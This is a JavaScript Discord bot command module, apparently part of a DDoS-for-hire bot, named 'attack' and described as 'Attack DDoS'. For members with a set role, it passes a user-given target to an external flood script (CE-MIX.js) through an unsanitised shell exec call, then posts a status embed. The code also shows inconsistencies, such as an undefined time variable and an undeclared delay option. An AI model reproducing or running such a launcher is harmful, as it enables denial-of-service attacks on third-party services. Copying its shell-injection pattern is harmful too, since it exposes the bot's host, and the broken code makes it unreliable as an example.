const { MessageEmbed } = require("discord.js")
const ayarlar = require('../../ayarlar.json');
var version = ayarlar.versionbot;
var roleID = ayarlar.roleID;
var img = ayarlar.img;

module.exports = {
    name: 'attack',
    description: 'Attack DDoS',
    type: 'CHAT_INPUT',
    cooldown: 60,
    options: [
    {
      name: "TARGET",
      description: "TARGET",
      required: true,
      type: "STRING",
    },
  ],

  run: async (client, interaction) => {

    if (!interaction.member.roles.cache.has(roleID))
      return interaction.reply({
        embeds: [
          new MessageEmbed()
            .setColor("RANDOM")
            .setDescription(`Chỉ có <@&${roleID}> mới được dùng lệnh này.`)
            .setFooter({ text: "© Developer: Nguyễn Xuân Trường#0001" })
            .setTimestamp(),
        ],
      });

    const target = interaction.options.getString("target")
    const delay = interaction.options.getNumber("delay")

    var exec = require('child_process').exec
      exec(`node CE-MIX.js ${target} ${time}`, (error, stdout, stderr) => {
    });

    console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
        .addFields(
        {
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`💥 Mục tiêu:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${delay} giây ] \n\`\`\``,
          inline: true,
        })
        .setFooter('© Developer: Nguyễn Xuân Trường#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: Nguyễn Xuân Trường#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] });
              }, 3000)
            })
    }
}